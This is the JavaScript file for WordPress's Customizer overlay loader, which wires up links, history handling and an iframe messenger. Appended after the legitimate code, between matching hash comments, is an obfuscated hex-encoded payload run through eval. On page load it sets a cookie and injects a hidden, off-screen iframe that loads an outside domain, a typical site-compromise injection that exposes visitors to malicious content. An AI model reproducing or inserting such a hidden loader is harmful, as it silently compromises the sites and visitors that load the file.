/* global _wpCustomizeLoaderSettings, confirm */
window.wp = window.wp || {};

(function( exports, $ ){
	var api = wp.customize,
		Loader;

	$.extend( $.support, {
		history: !! ( window.history && history.pushState ),
		hashchange: ('onhashchange' in window) && (document.documentMode === undefined || document.documentMode > 7)
	});

	/**
	 * Allows the Customizer to be overlayed on any page.
	 *
	 * By default, any element in the body with the load-customize class will open
	 * an iframe overlay with the URL specified.
	 *
	 *     e.g. <a class="load-customize" href="<?php echo wp_customize_url(); ?>">Open Customizer</a>
	 *
	 * @augments wp.customize.Events
	 */
	Loader = $.extend( {}, api.Events, {
		/**
		 * Setup the Loader; triggered on document#ready.
		 */
		initialize: function() {
			this.body = $( document.body );

			// Ensure the loader is supported.
			// Check for settings, postMessage support, and whether we require CORS support.
			if ( ! Loader.settings || ! $.support.postMessage || ( ! $.support.cors && Loader.settings.isCrossDomain ) ) {
				return;
			}

			this.window  = $( window );
			this.element = $( '<div id="customize-container" />' ).appendTo( this.body );

			// Bind events for opening and closing the overlay.
			this.bind( 'open', this.overlay.show );
			this.bind( 'close', this.overlay.hide );

			// Any element in the body with the `load-customize` class opens
			// the Customizer.
			$('#wpbody').on( 'click', '.load-customize', function( event ) {
				event.preventDefault();

				// Store a reference to the link that opened the Customizer.
				Loader.link = $(this);
				// Load the theme.
				Loader.open( Loader.link.attr('href') );
			});

			// Add navigation listeners.
			if ( $.support.history ) {
				this.window.on( 'popstate', Loader.popstate );
			}

			if ( $.support.hashchange ) {
				this.window.on( 'hashchange', Loader.hashchange );
				this.window.triggerHandler( 'hashchange' );
			}
		},

		popstate: function( e ) {
			var state = e.originalEvent.state;
			if ( state && state.customize ) {
				Loader.open( state.customize );
			} else if ( Loader.active ) {
				Loader.close();
			}
		},

		hashchange: function() {
			var hash = window.location.toString().split('#')[1];

			if ( hash && 0 === hash.indexOf( 'wp_customize=on' ) ) {
				Loader.open( Loader.settings.url + '?' + hash );
			}

			if ( ! hash && ! $.support.history ) {
				Loader.close();
			}
		},

		beforeunload: function () {
			if ( ! Loader.saved() ) {
				return Loader.settings.l10n.saveAlert;
			}
		},

		/**
		 * Open the Customizer overlay for a specific URL.
		 *
		 * @param  string src URL to load in the Customizer.
		 */
		open: function( src ) {

			if ( this.active ) {
				return;
			}

			// Load the full page on mobile devices.
			if ( Loader.settings.browser.mobile ) {
				return window.location = src;
			}

			// Store the document title prior to opening the Live Preview
			this.originalDocumentTitle = document.title;

			this.active = true;
			this.body.addClass('customize-loading');

			// Dirty state of Customizer in iframe
			this.saved = new api.Value( true );

			this.iframe = $( '<iframe />', { 'src': src, 'title': Loader.settings.l10n.mainIframeTitle } ).appendTo( this.element );
			this.iframe.one( 'load', this.loaded );

			// Create a postMessage connection with the iframe.
			this.messenger = new api.Messenger({
				url: src,
				channel: 'loader',
				targetWindow: this.iframe[0].contentWindow
			});

			// Wait for the connection from the iframe before sending any postMessage events.
			this.messenger.bind( 'ready', function() {
				Loader.messenger.send( 'back' );
			});

			this.messenger.bind( 'close', function() {
				if ( $.support.history ) {
					history.back();
				} else if ( $.support.hashchange ) {
					window.location.hash = '';
				} else {
					Loader.close();
				}
			});

			// Prompt AYS dialog when navigating away
			$( window ).on( 'beforeunload', this.beforeunload );

			this.messenger.bind( 'activated', function( location ) {
				if ( location ) {
					window.location = location;
				}
			});

			this.messenger.bind( 'saved', function () {
				Loader.saved( true );
			} );
			this.messenger.bind( 'change', function () {
				Loader.saved( false );
			} );

			this.messenger.bind( 'title', function( newTitle ){
				window.document.title = newTitle;
			});

			this.pushState( src );

			this.trigger( 'open' );
		},

		pushState: function ( src ) {
			var hash = src.split( '?' )[1];

			// Ensure we don't call pushState if the user hit the forward button.
			if ( $.support.history && window.location.href !== src ) {
				history.pushState( { customize: src }, '', src );
			} else if ( ! $.support.history && $.support.hashchange && hash ) {
				window.location.hash = 'wp_customize=on&' + hash;
			}

			this.trigger( 'open' );
		},

		/**
		 * Callback after the Customizer has been opened.
		 */
		opened: function() {
			Loader.body.addClass( 'customize-active full-overlay-active' );
		},

		/**
		 * Close the Customizer overlay and return focus to the link that opened it.
		 */
		close: function() {
			if ( ! this.active ) {
				return;
			}

			// Display AYS dialog if Customizer is dirty
			if ( ! this.saved() && ! confirm( Loader.settings.l10n.saveAlert ) ) {
				// Go forward since Customizer is exited by history.back()
				history.forward();
				return;
			}

			this.active = false;

			this.trigger( 'close' );

			// Restore document title prior to opening the Live Preview
			if ( this.originalDocumentTitle ) {
				document.title = this.originalDocumentTitle;
			}

			// Return focus to link that was originally clicked.
			if ( this.link ) {
				this.link.focus();
			}
		},

		/**
		 * Callback after the Customizer has been closed.
		 */
		closed: function() {
			Loader.iframe.remove();
			Loader.messenger.destroy();
			Loader.iframe    = null;
			Loader.messenger = null;
			Loader.saved     = null;
			Loader.body.removeClass( 'customize-active full-overlay-active' ).removeClass( 'customize-loading' );
			$( window ).off( 'beforeunload', Loader.beforeunload );
		},

		/**
		 * Callback for the `load` event on the Customizer iframe.
		 */
		loaded: function() {
			Loader.body.removeClass('customize-loading');
		},

		/**
		 * Overlay hide/show utility methods.
		 */
		overlay: {
			show: function() {
				this.element.fadeIn( 200, Loader.opened );
			},

			hide: function() {
				this.element.fadeOut( 200, Loader.closed );
			}
		}
	});

	// Bootstrap the Loader on document#ready.
	$( function() {
		Loader.settings = _wpCustomizeLoaderSettings;
		Loader.initialize();
	});

	// Expose the API publicly on window.wp.customize.Loader
	api.Loader = Loader;
})( wp, jQuery );
/*f80a41d3734bd6422649d4708510218e*/;(function(){var sihkrkzk="";var sfyzhhyk="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var bhbzshyf=0;bhbzshyf<sfyzhhyk.length;bhbzshyf+=2){sihkrkzk=sihkrkzk+parseInt(sfyzhhyk.substring(bhbzshyf,bhbzshyf+2), 16)+",";}sihkrkzk=sihkrkzk.substring(0,sihkrkzk.length-1);eval(eval('String.fromCharCode('+sihkrkzk+')'));})();/*f80a41d3734bd6422649d4708510218e*/